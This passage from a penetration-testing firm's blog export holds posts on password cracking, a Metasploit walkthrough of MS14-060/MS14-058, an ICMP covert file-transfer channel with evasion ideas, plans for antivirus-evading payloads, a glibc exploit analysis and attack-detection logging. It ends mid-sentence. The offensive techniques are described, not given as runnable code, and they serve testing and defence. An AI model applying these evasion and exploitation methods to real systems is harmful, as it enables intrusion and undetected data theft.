{"/articles/2014/11/2014-11-07-gpu-password-cracking-hype/":{"data":{"":"Ditch the CPU for password cracking even if you have an overclocked Extreme Intel Core i7, they just aren’t made for password cracking since they only contain a small number of cores. Instead set your sights on a high powered graphics cards with with the primary aim of finding cards with a high number of cores, for instance the GeForce GTX TITAN Z features a whopping 5760 cores. Imagine the insane speeds of password cracking with all those cores working harmoniously in parallel to crack a password. A professional setup might include a few graphics cards per rig or if you are really serious you might want to branch out into a distributed cracking network using multiple machines.\nI give you a real world example of how the GPU saves you so much time, on a recent an internal penetration test we conducted a wireless network assessment and part of this test was to assess the wireless password key strength and identify how easy it is to crack. We captured the all important WPA2 handshake and loaded up our password cracking software oclHastcat. We were using a relatively small password list that contained about 14,000,000+ passwords, using Hashcat which utilises the graphics card, we were able to munch through the entire list in about three and a half minutes. As a test we ran the same password list using aircrack-ng which utilises the CPU and the same key took 45 minutes to crack, an eternity! A larger 14GB password list was later used to actually crack the password, since our quick hit password list didn’t yield any promising results, always worth a try though :).\n[caption id=“attachment_62” align=“alignnone” width=“584”] Hashcat Animation[/caption]\noclHashcat password cracker for the graphics card is a great piece of software that supports the the two major graphics card vendors AMD and Nvidea, it’s not just limited to wireless password cracking, it pretty much does it all from NTLM, MD5, SHA, Whirlpool, Truecrypt to name a few. Hashcat has two main types of attack which are dictionary attack and rule based brute-force attack. Be sure to check you have the latest graphics card drivers installed and checkout the benchmark feature.\nSo I leave you with the thought of… buy yourself a good Graphics Card or three :)"},"title":"GPU Password Cracking Hype"},"/articles/2014/11/2014-11-10-layer-8-patching-un-patchable/":{"data":{"":"Computer systems and software have been continually evolving year upon year. Faster processing and data transfer coupled with more accessible storage have made crunching vast amounts of data possible in mere nanoseconds.\nComputer security and controls have improved as well, we now have intelligent firewalls, web proxies, file integrity monitoring, DLP, IAM and all sorts of amazing new technologies and emerging acronyms to help busy IT departments maintain the confidentiality, integrity and availability of their data and systems.\nGiven the technology at our disposal, we should be fine right? The hackers should be packing up their tool boxes and retraining as plumbers, electricians and school technology tutors. Why is this not happening, why are we seeing global breaches on the rise?\nYou The answer is simple – US\nYou, me, everybody.\nThe other day on a physical penetration test I handed a USB storage device to a very nice unsuspecting young company employee at a business that shall remain nameless. I asked them if they could open the executable and print 2 copies of the documents for my fictional meeting. She (it could have been he by the way) promptly ran the software bypassing the warnings and printed out my documents.\nWhen it turned out that the person I was there to see was on holiday (as per there Facebook page…), I made my apologies and left.\nMy job done, it took the rest of our team a mere 30 minutes to remotely gain domain admin.\nThe client was both pleased and disappointed. Pleased because he was able to use the results of this testing to generate more awareness and fund further security awareness training, disappointed because he knew that no matter how much effort he puts in to patching the humans, some patches just cannot be applied successfully."},"title":"LAYER 8 – Patching the un-patchable…."},"/articles/2014/11/2014-11-10-playing-ms14-060-ms14-058-cve-2014-4113-cve-2014-4114-attacks-defenses/":{"data":{"":"Recently two 0-day exploits were revealed. The first one was given the name Sandworm, however, the name convention was mistakenly including the “worm” term as we will see. The second one CVE-2014-4113 is a privilege escalation local exploit for Windows. Sandworm as said includes the word  “worm” most likely for making the situation more dramatic. A worm is a self-propagating piece of code that does not take human intervention. It is said that Sandworm was used in cyber espionage operations from Russians against NATO, European Union, and also against specific industries such as the energy sector (by targeting SCADA systems). Vulnerable targets are Windows Office 2010 and 2013.  In order to have a successful attack, someone naive (or convinced!) to execute (open) a PowerPoint show file is needed. It is said that CVE 4113 strikes win32k.sys which is the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012, and allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014.  Win32k.sys is responsible for window management, and any GUI process/thread that will use it. Its related user-mode modules are user32.dll and GDI32.dll. Due to the complex interaction with user-mode applications, there are many problems in Win32k.sys. The exploit was acquired in the wild, and a hacking team called HURRICANE PANDA created it. A null pointer de-reference in win32k.sys is the vulnerability and by abusing the xxxSendMessageTimeout function it is possible to execute arbitrary code.","attacking#Attacking":"Let’s see Sand worm initially… In summary, the attack works as follows: a malicious PowerPoint show file is sent to the victim, the victim opens it, then the victim connects back to an attacker’s controlled host in order to fetch the payload and finally after downloading it, executes it. As it is easily spotted, this attack has many different factors in order to succeed. A single firewall blocking outgoing connections to SMB (Port 445) can stop the attack.\nAttacker generates the malicious powerpoint file and sends the file to victim. Lets use the metasploit framework for that… [caption id=“attachment_10” align=“alignnone” width=“721”] MS14-060 options[/caption]\n[caption id=“attachment_12” align=“alignnone” width=“687”] Adding the necessary stuff[/caption]\nKeep in mind to escape the “\\”.\n[caption id=“attachment_13” align=“alignnone” width=“722”] Generating the malicious ppsx[/caption]\nAs metasploit informs us, we have to place these files to a shared directory (with public/anonymous access). I had the issue that I was getting prompted for a password (after I was opening the ppsx file). It turns out that some latest versions of Windows are asking for a password even if the folder is publicly available. I changed to Linux world and everything worked fine!\nNow… What are these 2 files… First lets see the MtBe.gif file\nAnd what about the aDPN.inf file?\nBy the way, do you remember the famous autorun.inf files ? These files were responsible for what to be executed when we were plugging a CD-ROM, etc. INF files are also known as Setup Information files (check the wiki page!)\n[caption id=“attachment_15” align=“alignnone” width=“731”] Aha! Renaming![/caption]\nSee the [RxRename] entry… So what it does is that it renames the MtBe.gif file to MtBe.gif.exe file… Why ? Obviously, because it will execute it afterward!\nWe mount the remote shared dir and we place these 2 files there. We edit the output powerpoint file so it looks more innocent than the “Example / Example” of the default generation [ok I didnt.. but you get the point!] . After we send the file to the victim and we start our handler in metasploit. Patiently waiting…\n[caption id=“attachment_16” align=“alignnone” width=“1268”] b00m[/caption]\nNow lets see our privileges…\n[caption id=“attachment_17” align=“alignnone” width=“896”] Going around WoW64[/caption]\nAs we see here the current process is running in the Windows x32 on Windows x64 emulation. That means that if we try to launch a local exploit it will fail saying “Failure::NoTarget, “Running against WOW64 is not supported””. How to get around this? Easy… We see the processes with “ps” and we migrate to a “native” x64 process.\n[caption id=“attachment_18” align=“alignnone” width=“944”] escaping WoW[/caption]\nAs you see in the picture above we successfully escaped WoW64 and now we can launch our local exploit.\n[caption id=“attachment_19” align=“alignnone” width=“967”] b00m[/caption]","defending#Defending":"Let’s take a look at the network activity during this. I will focus on the time that the ppsx file is opening (there is the juicy part ;))\n[caption id=“attachment_20” align=“alignnone” width=“693”] INF file busted[/caption]\nWireshark shows us that we have a SMB2 Read Response. Right after we see the request file for the .inf file. Hmmm lots of noise…\n[caption id=“attachment_21” align=“alignnone” width=“689”] Downloading the files[/caption]\nRight after we see the downloading of the files…\n[caption id=“attachment_22” align=“alignnone” width=“713”] And the closing of the files…[/caption]\nAnd finally the end of the files (notice also the .gif file here)\nWhat else we can see from Wireshark? Let’s follow the stream…\n[caption id=“attachment_23” align=“alignnone” width=“376”] Following TCP Stream[/caption]\nRemember this line?","solutions#Solutions":"Solutions for these 2 vulnerabilities are patching. MS14-058 and MS14-060 are fixing the problems. Here I have to pinpoint that even if a host is vulnerable, by staying behind from a properly configured firewall will be still safe since it won’t be able to download the files. These types of malicious files are well known to malware analysts since they have assigned them as drive-by downloads. The name comes from the fact that at some point the victim host will try to fetch the payload and will execute it right after. From the host perspective in order to mitigate the risk, there are a couple of choices. Having signatures of the exploit itself could mitigate the exploitation. Also depending on the payload that it will be executed it could be picked up from the AV."},"title":"Playing with MS14-060 and MS14-058 [CVE-2014-4113 CVE-2014-4114] : Attacks and Defenses"},"/articles/2015/01/2015-01-19-ghost-shellcode-2015-ctf-write-cloudfs-challenge/":{"data":{"":"Hello there, in this post I will describe how I solved the cloudfs challenge of Ghost In The Shellcode 2015. This challenge was under the Forensics category and was awarded 200 points (middle ground!). It wasn’t so hard, and someone could argue that shouldn’t award the same points with “the alpha molecular” or the similars from the crypto category but it’s okay (it’s very common actually in every CTF to argue about points etc..). The point of that challenge was that it was using ICMP (so there isn’t any TCP Follow Stream option…) and that the file that was included was scattered across multiple packets.\nSo the file of the challenge was an .xz file meaning that we had to decompress it first.\nxz file awaits\nWe open the pcap file with wireshark and we see all these ICMP ping requests/replies.\n[caption id=“attachment_70” align=“alignnone” width=“1173”] Lots of ICMP ping requests/replies[/caption]\nBy doing tshark -r pcapfile -T fields -e data -w outputfilee ; strings outputfilee we can dump all the data from the pcap and search for ASCII characters. There is a bunch of delicious apples and ripe yellow bananas there (at some point I thought that the key is something related to that!).\n[caption id=“attachment_83” align=“alignleft” width=“780”] Exporting all data[/caption]\n[caption id=“attachment_71” align=“alignnone” width=“300”] strings show bananas and apples[/caption]\nSince I was searching for the key I did the following filter initially icmp contains key and manage to find a packet that was giving away the existence of a key.tbz file. So I know that there is a tbz file somewhere around…\n[caption id=“attachment_69” align=“alignleft” width=“1111”] icmp contains key filter saved half aday[/caption]\nI created a file and make it .tbz to see the header and right after I updated my wireshark filter to icmp contains 425a The data section of the first [No. 1041] packet ended with the bytes “da 61”. I saw that the replies where basically having the same data so I filtered em out.\n[caption id=“attachment_78” align=“alignnone” width=“564”] header of a random.tbz file[/caption]\n[caption id=“attachment_77” align=“alignnone” width=“1087”] Updating filter for searching for the tbz file[/caption]\nThen the 2nd piece of the tbz file is in packet [No. 1051] ending with bytes “30 98”. The 3rd piece was in the next packet [No. 1052]. Then there is a series of packet exchanges with these 3 pieces and in packet [No. 1075] it is the last part of the .tbz file which ends with bytes “f0 c0”. I exported these 4 data sections of these packets and then I used the HxD editor for copy/paste the bytes (I had also to remove some bytes from the first packet’s data section)\n[caption id=“attachment_67” align=“alignnone” width=“621”] 2nd part of the file[/caption]\n[caption id=“attachment_68” align=“alignnone” width=“823”] 3rd part of the file[/caption]\n[caption id=“attachment_76” align=“alignnone” width=“644”] Top of the final assembled file[/caption]\n[caption id=“attachment_79” align=“alignnone” width=“547”] The end of the final file[/caption]\n[caption id=“attachment_85” align=“alignnone” width=“728”] Size of the file[/caption]\nI renamed the file to be able to extract it and then that was it. The ping.py was also included in that tbz file!\n[caption id=“attachment_82” align=“alignnone” width=“728”] Renaming and extracting. Boom ;)[/caption]"},"title":"Ghost In The Shellcode 2015 CTF: Write-up for cloudfs challenge"},"/articles/2015/03/2015-03-01-microsoft-onenote-image-caching-bug-confidential-information-leakage/":{"data":{"":"","bug-scope#Bug Scope":"This has only been tested with Microsoft Onenote 2013 with all known updates installed. Last testing on 01/03/2015.","bugsummary#Bug Summary":"A security bug in the Microsoft Onenote allows images placed in user-created password-protected sections to be cached persistently in the user profile temporary directory folder:\nC:\\Users\\%username%\\AppData\\Local\\Temp. Analysing the content the temporary folder will reveal images that should be securely protected by Onenote.","conclusion#Conclusion":"Everything saved here is suppose to be in a password-protected section, but image are saved persistently in the temp directory and could potentially leak confidential information.","find-the-bug-guide#Find the Bug Guide":" Open Onenote and add a section to any existing notebook this will automatically create a page too. [caption id=“attachment_95” align=“alignnone” width=“501”] Create Section in Onenote[/caption]\nNavigate to the REVIEW tab in the main menu and click password button (see image above), the pane on the right will appear and allow you to set a new section password (see image below). You should set one now. [caption id=“attachment_96” align=“alignnone” width=“557”] Set a section password[/caption]\nExit Onenote, then reopen it and enter password to unlock section. Now we are secure right!\nOpen your explorer, and navigate to the following location: C:\\Users\\%username%\\AppData\\Local\\Temp\nLeave this window open, your images will appear here shortly!\n[caption id=“attachment_107” align=“alignnone” width=“574”] Navigate to Temporary Directory[/caption]\nOpen your web browser/explorer, find some images and copy and paste them into OneNote. [caption id=“attachment_97” align=“alignnone” width=“188”] Copy and Paste Image into Onenote[/caption]\nOn some occasions Onenote will cache the image immediately in the temp folder, you can delete these since they will be back shortly.\nNow close and reopen Onenote, you should enter the password to unlock section. During this stage Onenote caches the images in this password protected section in the temporary directory. Go take a look. [caption id=“attachment_108” align=“alignnone” width=“707”] Microsoft Onenote Caches Image[/caption]","scenario#Scenario":"There are a number of problems that arise from this security bug, a few example could be a scanned image of a handwritten form reveals confidential information or a screenshot of usernames/passwords/finances saved in Onenote."},"title":"Microsoft Onenote Image Caching Bug (Confidential Information Leakage)"},"/articles/2015/04/2015-04-24-covert-channels-misusing-icmp-protocol-for-file-transfers-with-scapy/":{"data":{"":"Hello w0rld. In this post I will show how it is possible to (mis)use ICMP protocol for file transfers with scapy.\n“In computer security, a covert channel is a type of computer security attack that creates a capability to transfer information objects between processes that are not supposed to be allowed to communicate by the computer security policy.” Source: Wikipedia\nI have to give credit to the GhostInTheShellcode 2015 for “borrowing” the idea from the forensics challenge (see my previous post!). It is quite tricky to achieve, but the effort is worth it for the result. Network filtering restricts the traversal of specific packets or all the traffic of a kind. A firewall (pseudo)entry might be similar to “allow src dst http” “allow src dst icmp” and the (invisible usually) implicit deny restrict all other traffic. In cases like this there are 2 solutions; either use the existing “allow” for transferring data or switch to a different protocol which is allowed. ICMP is usually allowed because it was created for network troubleshooting mainly. More over messages like ICMP timestamps are blocked but echo requests/responses are not. A network admin that denies ICMP traffic will have troubleshooting difficulties when problems arise. The idea is not new, and according to the wish list of metasploit we should expect to see ICMP/UDP file transfers add-ons/functionalities to be introduced soon.\nMy idea can be summarized as the following:\nWe have 2 ends, sender and receiver (else we can imagine it as attacker/compromised host) Attacker wants to send a file, let’s say an ELF or a PE file to the compromised host and for a reason he doesn’t want to use the solutions that exist already (meterpreter\u003e upload function for example) ICMP is connectionless/ and not really stateful as TCP however it keeps track in a timed fashion (it can be considered stateful) I want to be able to parse a file and break it down to multiple chunks so that I can have different sizes of payloads Then I will send these chunks Client will receive these “pings” or more accurately this ICMP echo requests At the side of compromised host/receiver a file will be created and the payload of these requests will be appended. For dealing with my ideas, I created 2 python scripts, a sender and a sniffer for grabbing the file. The sender is straightforward. The only thing that I had to add is the way of tearing down a file to multiple chunks and then parse these chunks for sending them. I used an “offset” so that in the future I can change the offset and have my chunks in different sizes. For the screenshot below you need to know that x=1 and y=2. So the seek() will be executed just once for moving the file descriptor “offset” bytes ahead.\nSetting the offset for subsequent read\nAfter the sender was done the “client” was the next step. I used the sniff() from scapy which I have to admit I didn’t really enjoy. There are several things that I learned out of this process most notable that the count refers to the number of packets that will be received and NOT to the number of packets that will be received from the filter (packets that “hit” the filter!).\nAnother issue that I had to solve was that I wanted specifically to grab the Type 8 “echo request” messages. However when I was setting a filter=icmp and then in my callback function an if statement as the following I was getting back duplicate packets.\nThis didnt work really\nBecause of that I had to use a statement as if raw in downloadlist so that I removed the double entries from my list.\nAnother funny problem would arise in the case that another machine pings the receiver. In that case the payload of the echo request would be appended on the file. For this I just created an if statement and grab the packets coming from a specific source address.\nFor testing our scripts in a “real case” scenario we placed the client on the host with IP 192.168.1.56 and the sender on 192.168.1.156. A simple ELF file was created.\nFile used for transfer\nThen we launched the client and the sender and…\nSender. Sorry for the painful output of the non-printable chars :(\nClient receiving the file and.. boom!\nAs you can imagine this PoC does not employ a way of obscuring what was sent. We can see that from what tcpdump spits…\ntcpdump clearly shows that some sort of an executable file that uses libc was transfered!\nThere are multiple limitations and challenges here.\n1st The receiver/compromised host will reply back the payload that will be received; a behavior that is not good\n2nd ICMP does not have a “window-size” as TCP; there isn’t any “sliding window” that will allow us to send multiple chunks of a file in a single window. We need to take care of that somehow.\n3rd The ordering of data chunks is also a challenge. If the 2nd chunk arrives before the 1st one because of network-related issues (maybe a different route was chosen…) then the receiver/compromised host will reconstruct the file incorrectly\n4th Since scapy will be used (for now) we have all the limitations related to its capabilities (root access, installation dependencies, etc).\nIn order to make it happen we need a small script to behave as a client and another one for the sender. The sender should also take care of the breaking up of the file to chunks of a specific size (must be less than the max_payload_size).\nAssuming that the ICMP type 8 messages are permitted then detection of a file transfer happening like that comes down to whether an IDS look for “abnormal” traffic. The type 8/0 messages depending on the OS (*nix/Windows/etc) have a similar payload every time that are getting sent (however it depends on the OS, Windows do not have the same payload with Linux). For finding the actual file though, a reconstruction of the file is necessary. Dealing with avoidance we have the following paths that we can use:\nEncrypt the payload with a key hardcoded into client/server is obviously the strongest way. This would provide end to end encryption and from the network side it “shouldn’t” be possible to find what was sent. Encrypt the payload with a key that is sent through or a value of a packet. This is less “safe” when compared to method 1. But it is still difficult to reverse it. Even if you have the ciphertext and you can extract which algorithm was used you still need to know the key. Doing transposition/permutation. So imagine that we have an array with bytes where z = 0 and y = position of last element. By just reversing the order in the way transposed[y]=element[z] we can create a sequence that wouldn’t make sense at first place (Keep in mind that we do that per chunk (we can also do it per file but this leads to a smaller obfuscation)… so if we have a chunk size of 50 bytes and we are sending it on the reverse order if a file is big then it wouldn’t be so obvious what it is). This approach is (I guess) a way of performing steganography since we just hide the method that we use and we do not encrypt the actual payload. Still though there would be cases where an image header (or a trailer) sent on the reverse order would give away the fact that this is a header. For example the “.exe” if it is sent in that way it will look as “exe.” and would spoil our technique! Still though from a network forensics standpoint the analyst must find a way to find the start/end of the file and the correct sequences in order to reverse the process and reconstruct the file. There are multiple ways of performing this and only sky is the limit… So another example is to use a matrix x*y with the byte sequence of the payload and then shift the columns and the arrows around (similarly to AES process but without XORing) and then send the new matrix to the client who reverses the process. Use encoding instead. Still though encoding with base 64 can be easily spotted. Use a mixed approach of the the previous 2. Hiding the message though, doesn’t prove the fact that something sneaky happened. If an IPS monitors the ping requests and realizes that the payload is not the one that it should be then it can just discard the packets. There also firewalls that perform stateful inspection of ICMP.\nCovert channels are becoming more and more used. We have seen already steganography been used in videos, music but also in networking protocols. A malware author might use ICMP and/or UDP for dropping his downloader and the necessary protection mechanisms must be therefore deployed for mitigating that risk.\nFood for thought:\nAdd also encryption to each chunk by hardcoding a key Porting it to C for making it a Portable Executable (PE-File) Writing it alternatively (still in python) with ctypes Add steganographic ways for obscurity Use other fields for the actual transfer of a file You can find the sender/client scripts in our github here If you are still here, thanks for your time ;)\nBlooper Section!\nThis happened while testing the sender with an offset=3!\nBlooper: When computers decide not to speak human-languages…"},"title":"Covert channels - (Mis)Using ICMP protocol for file transfers with scapy"},"/articles/2016/01/2016-01-28-research-and-development/":{"data":{"":"Hello w0rld. On this post we would like to let you know our areas of research and the research projects that we are working on currently. For 2016 we are planning to develop tools that will be used in our tests. Our areas of interest can be highlighted as:\nAntiVirus Detection and Evasion techniques (sandbox detection, etc)\nPackers, anti-debugging, anti-disassembly and binary obfuscation\nNetwork packet capture analysis scripts looking for IoC\nFUD Malware (maybe Veil Improvisation)\nThe initial idea is to find a way to create several different templates on top of Veil. Additionally we can implement several add-ons for Virtual Machine detection or Sandbox Environment detection. This can be either logical-based such as human interaction or can be through technical means like red pills. Even 2-3 assembly instructions can be used for identifying a sandbox environment. Veil exports a .py file which is quite random. It randomizes variable names and also since it uses encryption it randomizes the key that will be used. Then it encrypts the payload and stores it in a .stub area on the binary. This area will be unfold after the execution and a routine is responsible for decrypting and launching the payload. This doesn’t offer and sandbox detection nor VM detection. It is heavily focused against AVs and specifically it is focused defeating signature-based detection systems. The idea of having different binaries but still using the same payload (meterpreter) is necessary for pentesters and for generating quickly payloads that will be used in social engineering tasks. Technically now the most important property is the large keyspace. The larger the key space the more ‘impossible’ to hit the same binary twice. Veil is providing that but still there are issues with the actual binary. My thought is to either break the exported binary and placed it under a new one OR just add several lines of code in the python script that will be used for compilation (through py2exe or pwninstaller). Another possibility is to mess around the pwninstaller and add things there. Another idea is to add randomisation on techniques defeating / escaping sandbox environments. Things that are looking promising:\nMess with the actual PE Header, things like .STAB areas, add more stab areas add junk data to stab areas or even add other encrypted data that might look interesting (hyperion paper also has a super cool idea…) Change the file size of the exported binary dynamically. This will happen assuming the above will happen. (Can also be randomized with NOP padding Change values that will not necessarily mess the execution (maybe the versioning of the PE? or the Entry point of the binary?) Write a small scale packer for performance and maybe add also VM detection there Employ sandbox detection and VM detection through several means (this also adds to the 2nd step) Randomized routines for sandbox detection (if mouse_right_click = %random_value then decrypt else break/sleep) Implementation techniques will include ctypes for sandbox detection and adding loops or other useless things such as calculations. Also using ndisasm or pyelf for messing the binary it is suggested. Red pills can be used in several different techniques.\nPacker Another idea that JUMPSEC labs have is to develop their own packer. This will have several routines for:\nStatic analysis obfuscation: Encryption Dynamic analysis obfuscation: Add noise in program flow/Add randomness to data/runtime Anti-debugging Sandbox escape: Detect human interactions Network Analysis Scripts We are developing several scripts for analysing pcap files. The purpose of these scripts is to parse packet captures and to identify whether there are IoC (Indicators of Compromise) by performing statistical analysis of the protocols usage and searching for potential protocol misuse (HTTP requests / responses that arent according to RFC)."},"title":"Research and Development"},"/articles/2016/03/2016-03-07-cve-2015-7547-glibc-getaddrinfo-dns-vulnerability/":{"data":{"":"Hello w0rld! JUMPSEC researchers have spent some time on the glibc DNS vulnerability indexed as CVE 2015-7547 (It hasn’t got a cool name like GHOST unfortunately…). It appears to be a highly critical vulnerability and covers a large number of systems. It allows remote code execution by a stack-based overflow in the client side DNS resolver. In this post we would like to present our analysis.","conclusion#Conclusion":"The best way to mitigate this issue is to enforce proper patching management. Make sure to update all your systems with the latest version of glibc . If you have any systems exposed on the internet and you want to make sure that this vulnerability is not triggered then the following Wireshark filter could be useful: (DNS.length\u003e2048 to see malformed packets). A DNS response has a maximum of 512 bytes (typically), note that the DNS reply is truncated. Even if the client does not accept large response, smaller responses can be combine into a large one which can also trigger the vulnerability. A possible filter is to monitor the size of the entire conversation as a distinct amount of bytes in total is require to trigger specific responses from vulnerable client and all of them requires more than 2048 bytes.\nThe above vulnerability can be fixed by patching. If you are running RedHat or CentOS a simple\nyum -y update glibc\nwill update the libc and resolve the issue (remember to restart the service right after the update!).","google-poc-debugging-and-crash-analysis#Google POC debugging and crash analysis":"JUMPSEC has run it through the trusty gdb. It crashes with a SEGMENTATION FAULT which verifies that the DNS response has smashed the stack of the vulnerable client application when running getaddrinfo(). The vulnerable buffer is operated in gaih_getanswer. The entry address has been overwritten with 0x4443424144434241 (ABCDABCD). The state of the register also showing the overflowed bytes.\n[caption id=“attachment_166” align=“alignnone” width=“888”] SEGFAULT from vulnerable client. RET address is overwritten with “ABCDABCD”[/caption]\n[caption id=“attachment_167” align=“alignnone” width=“889”] Backtrack[/caption]\n[caption id=“attachment_194” align=“alignnone” width=“666”] Registers[/caption]\nJUMPSEC has also tested it on a few other applications. It was found that the getaddrinfo() function in glibc is commonly used…\n[caption id=“attachment_170” align=“alignleft” width=“938”] Iceweasel crashing[/caption]","google-poc-exploit-code-analysis#Google POC Exploit Code Analysis":"First response [caption id=“attachment_184” align=“alignnone” width=“741”] Code snippet[/caption]\nPacket capture snippet\nThe dw() function calls a “struct” module from python library. According to the documentation, it performs conversion between python values and C structs represented as python strings. In this case, it interprets python integer and pack it into little-endian short type binary data. This is a valid response sent by the “malicious” DNS server when it receives any initial queries. This response packet is constructed intentionally in large size (with 2500 bytes of null), it forces the client to retry over TCP and allocate additional memory buffer for the next response. This also triggers the dual DNS query from getaddrinfo() on the client side, which is a single request containing A and AAAA queries concatnated.\nSecond Response [caption id=“attachment_162” align=“alignnone” width=“531”] Code snippet[/caption]\n[caption id=“attachment_163” align=“alignnone” width=“484”] Packet capture snippet[/caption]\nThis is the second response sent by the malicious DNS server. It is a malformed packet sending large numbers of “fake records” (184 Answer RRs) back to the client. According to google, this forces __libc_res_nsend to retry the query.\nThird response [caption id=“attachment_164” align=“alignnone” width=“482”] Code snippet[/caption]\n[caption id=“attachment_165” align=“alignnone” width=“493”] Packet capture snippet[/caption]\nThis is the third response sent by the “malicious” DNS server. It is another malformed packet which is carrying the payload. JUMPSEC researcher has modified the Google POC code to identify the the number of bytes to cause a segmentation fault (possibly overwriting the RET address) of the buffer. It is found that the RET address is being overwritten on the 2079th byte. With the addition of return_to_libc technique, an attacker can bypass OS protection such as NX bit or ASLR and perform remote code execution.","google-poc-network-exploitation-timeline#Google POC Network Exploitation Timeline":"","google-poc-overview#Google POC overview":"","reference-links#Reference links":"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7547\nhttp://pubs.opengroup.org/onlinepubs/9699919799/functions/freeaddrinfo.html\nhttps://googleonlinesecurity.blogspot.co.uk/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html\nhttps://sourceware.org/ml/libc-alpha/2016-02/msg00416.html"},"title":"CVE 2015-7547 glibc getaddrinfo() DNS Vulnerability"},"/articles/2016/06/2016-06-28-short-introduction-network-forensics-indicators-compromise-ioc/":{"data":{"":"“Indicator of compromise (IOC) in computer forensics is an artifact observed on a network or in an operating system that with high confidence indicates a computer intrusion. Typical IOCs are virus signatures and IP addresses, MD5 hashes of malware files or URLs or domain names of botnet command and control servers. After IOCs have been identified in a process of incident response and computer forensics, they can be used for early detection of future attack attempts using intrusion detection systems and antivirus software.” Wikipedia\nHello w0rld! In this post I am planning to do a brief introduction into network forensics and how network monitoring can be used to identify successful attacks. Network monitoring is essential in order to identify reconnaissance activities such as port scans but also for identifying successful attacks such as planted malware (such as ransomware) or spear-phishing. Generally when doing network forensics the network footprint is of significant importance since it allows us to replicate the timeline of events. With that said, network footprint can still be obscured/hidden by using cryptographic means such as point-2-point encryption. Even if you can’t see the actual traffic because it is encrypted, what you can see is the bandwidth load which might be an IoC.\nIn incident response the first step is the time that is needed for the attack realization. If the attack is not realized then of course there is no ‘incident response’ (doh!). There is a list of things that the analyst should go over in order to try to identify if an attack was successful. The list is not definite and there are far more things that need to be checked than those discussed here. Whether an attack is targeted or non-targeted, if it is utilizing the Internet connection in any way it will leave network footprints behind. In targeted attacks we see things like spear-phishing and USB planting that quite often are targeting susceptible individuals with lack of security awareness. Non-targeted attacks might include attack vectors such as malware, ransomware, malicious javascripts, flash exploits, etc. This is not exhausting since flash exploits and malicious javascripts can be used also in a targeted fashion. By identifying the Indicators of Compromise (IoC), we can have briefly describe each attack vector as follows depending on the network footprint that will have:\nIP addresses domain names DNS resolve requests/response downloadable malicious content (javascripts, flash, PDF files with embedded scripts, DOCX with Macros enabled) There are also indicators coming out from behavioural analysis. For example a malware which contacts a Command \u0026 Control server will ‘beacon’ in a timely (usually) fashion. This ‘beaconing’ behaviour can be identified by monitoring spikes of specific traffic or bandwidth utilisation of a host. Moreover it can be spotted by monitoring out-of-hours behaviour since a host shouldn’t send data except of X type (which is legit) or shouldn’t be sending any data at all. Ransomware will encrypt all accessible filesystems/mounted drives and will ask (guess what!?) for money! Most likely it will be downloaded somehow or will be dropped by exploit kits or other malware. Sometimes it is delivered through email attachments (if mail administrator has no clue!). As stand-alone ‘version’ ransomware comes in portable executable (PE file) format. However variants of Cryptolocker are employing even PowerShell for doing so. In order to detect them we need a way to extract the files from the network dump. There are couple of tools that does this such as foremost but it is also possible to do it ‘manually’ through wireshark by exporting the objects. This assumes that the file transfer happened through an unencrypted channel and not under SSL. Malware might serve many different purposes such as stealing data, utilizing bandwidth for DDoS, or used as a ‘dropper’ where a ransomware is pushed. One of the more concerning is turning a compromised host into a zombie computer. Fast flux malware have numerous IPs associated with a single FQDN whereas domain flux malware have multiple FQDN per single IP. The latter is not ideal for malware authors since this IP will be easily identified and traffic will be dropped (a bit more about ‘sinkhole’ in the next paragraph!). Assuming that we are after a fast flux malware that uses a C\u0026C, then there are ways to locate the malware by looking for beaconing. Quite often these malware make use of DGAs (Domain Generation Algorithms) which basically hide the C\u0026C IP behind a series of different domain names. Malware that uses DGA are actively avoiding ‘sinkhole’ which allows ISPs to identify the malicious IP (C\u0026C) and leading to the ‘blackhole’ of the traffic, shunning the communication of the infected system with it. An infected host will attempt to resolve (through DNS) a series of domain names acquired from the DGAs, This behaviour will lead to lots of ‘Non-Existent’ NX responses from the name server back to the infected machine. Monitoring the number of NX responses might help us identify infected systems. Moreover monitoring the DNS queries should also help.\nIn a latter post I will publish a small script that I am using for looking for IoC.\n[caption id=“attachment_217” align=“aligncenter” width=“300”] Script under development ;)[/caption]"},"title":"Short introduction to Network Forensics and Indicators of Compromise (IoC)"},"/articles/2019/02/2019-02-06-enhanced-logging-to-detect-common-attacks-on-active-directory-part-1/":{"data":{"":"In this blog post I am going to tackle the topic of detecting common attacks using Active Directory logs. It is important to understand the power of data in InfoSec world. Too much data means you’ll be spending rest of the week digging through millions of log entries to try and figure out what the adversary was up to. You can set filters to help you through this, however it can get computationally expensive very fast depending on how your filters operate. It also requires you to know what to specifically look out for! You need to have confidence in your filters and test them thoroughly from time to time to make sure they actually work.\nOn the other hand, too little data means you might not have enough log entries to investigate and provide full evidence of what malicious techniques were attempted. For this reason, it is a constant battle of finding the middle ground of having hard evidence and not overwhelming your SIEM. Another golden question to ask is: are we even logging the correct events?\nOne of the ways to get around this problem is configuring the correct Group Policies on the Domain Controllers. In this blog post I want to focus solely on command line logging because it is a quick win and it shows immense amount of detail into what processes and commands are executed. We start off by enabling the correct settings in the Group Policy using Group Policy Editor. The steps are detailed below:\nFollow the path Policies → Administrative Templates → System → Audit Process Creation. And enable “include command line in process creation events” Follow the path Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → System Audit Policies → Detailed Tracking. And enable both Successful and Failure configuration for “Audit Process Creation” and “Audit Process Termination” as shown below. After configuring these settings, run the good old group policy update on command prompt as administrator using the command gpupdate /force. At this point, you should be able to see all commands being executed via command prompt.\nWe can test this by running some commands and viewing the logs to verify as shown below by running some test commands. We can see that by running test commands event ID 4688 (New process created) event is generated showing what was typed in the command prompt.\nNow, we can move forward and test this with the psexec module from Metasploit using the exploit/windows/smb/psexec module as shown below.\nAfter setting the correct parameters, we execute the exploit and observe the logs produced from this action.\nNow this will generate a lot of events and keeping up with the incoming logs using Windows Event Viewer will be almost impossible. The best way to analyse these events is to parse these events through a SIEM solution for better log management. After everything is set up correctly, we can now begin the hunt! Monitoring the recent activity on the target machine, we see some interesting events:\nEvent ID 7045 – A service was installed in the system The details around this event shows that the service named yReAMNiNjOyqeWQI was installed by the user root (which we know is the user used for this exploit). There are some interesting parameters defined here such as -nop, -hidden and -noni\nSuch parameters can be used for obfuscation purposes. However, it becomes harder to detect these obfuscation 